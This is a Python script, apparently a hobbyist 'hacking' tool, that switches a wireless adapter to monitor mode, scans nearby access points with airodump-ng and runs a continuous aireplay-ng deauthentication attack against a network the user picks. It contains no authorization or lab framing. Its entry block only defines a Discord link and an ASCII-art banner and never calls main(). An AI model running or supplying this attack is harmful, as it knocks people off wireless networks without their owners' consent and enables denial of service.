import subprocess
import re
import csv
import os
import time
from datetime import datetime
import sys
from pystyle import *

# Function to check for existing ESSIDs
def check_for_essid(essid, lst):
    return essid not in [item["ESSID"] for item in lst]

# Clear screen function
def clear_screen():
    subprocess.call("clear", shell=True)

# Main function to perform the attack
def perform_deauthentication_attack(hacknic, hackbssid, hackchannel):
    subprocess.run(["airmon-ng", "start", hacknic, hackchannel])
    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
    except KeyboardInterrupt:
        print("Done!")

# Main program
def main():
    # Detect superuser privileges
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()

    # Regex to find wireless interfaces
    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True, text=True).stdout)

    # Check for available WiFi adapters
    if not check_wifi_result:
        print("Please connect a WiFi adapter and try again.")
        exit()

    # Display available WiFi interfaces
    print("The following WiFi interfaces are available:")
    for index, item in enumerate(check_wifi_result):
        print(f"{index} - {item}")

    # Select WiFi interface
    while True:
        wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print("Please enter a number that corresponds with the choices available.")

    hacknic = check_wifi_result[int(wifi_interface_choice)]

    # Put WiFi adapter into monitor mode
    subprocess.run(["ip", "link", "set", hacknic, "down"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["iw", hacknic, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", hacknic, "up"])

    # Discover access points
    subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        while True:
            clear_screen()
            active_wireless_networks = []
            for file_name in os.listdir():
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID" or row["BSSID"] == "Station MAC":
                                continue
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

            print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nReady to make choice.")

    # User selects access point
    while True:
        choice = input("Please select a choice from above: ")
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print("Please try again.")

    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

    # Perform deauthentication attack
    perform_deauthentication_attack(hacknic, hackbssid, hackchannel)

if __name__ == "__main__":
    # Additional code
    commandhelp = " 'man --helppod--' "
    discordlink = "https://discord-join/rayzudevServer"
    titleIpLogger = """
            ##### ##                                                    /##              ##### ##                                     /       
         ######  /###     #                                           #/ ###           /#####  /##                                   #/        
        /#   /  /  ###   ###                                         ##   ###       //    /  / ###                            #     ##        
       /    /  /    ###   #                                          ##            /     /  /   ###                          ##     ##        
           /  /      ##                                              ##                 /  /     ###                         ##     ##        
          ## ##      ## ###   ###  /###     /###             /###    ######            ## ##      ##    /##       /###     ######## ##  /##   
          ## ##      ##  ###   ###/ #### / /  ###          / / ###  / #####            ## ##      ##   / ###     / ###  / ########  ## / ###  
        /### ##      /    ##    ##   ###/ /    ###        / /   ###/  ##               ## ##      ##  /   ###   /   ###/     ##     ##/   ### 
       / ### ##     /     ##    ##    ## ##     ##        ##    ##   ##                ## ##      ## ##    ### ##    ##      ##     ##     ## 
          ## ######/      ##    ##    ## ##     ##        ##    ##   ##                ## ##      ## ########  ##    ##      ##     ##     ## 
          ## ######       ##    ##    ## ##     ##        ##    ##   ##                #  ##      ## #######   ##    ##      ##     ##     ## 
          ## ##           ##    ##    ## ##     ##        ##    ##   ##                   /       /  ##        ##    ##      ##     ##     ## 
          ## ##           ##    ##    ## ##     ##        ##    ##   ##              /###/       /   ####    / ##    /#      ##     ##     ## 
          ## ##           ### / ###   ### ########         ######    ##             /   ########/     ######/   ####/ ##     ##     ##     ## 
     ##   ## ##            ##/   ###   ###  ### ###         ####      ##           /       ####        #####     ###   ##     ##     ##    ## 
    ###   #  /                                   ###                             #                                                       /  
     ###    /                              ####   ###                             ##                                                    /   
      #####/                             /######
"""
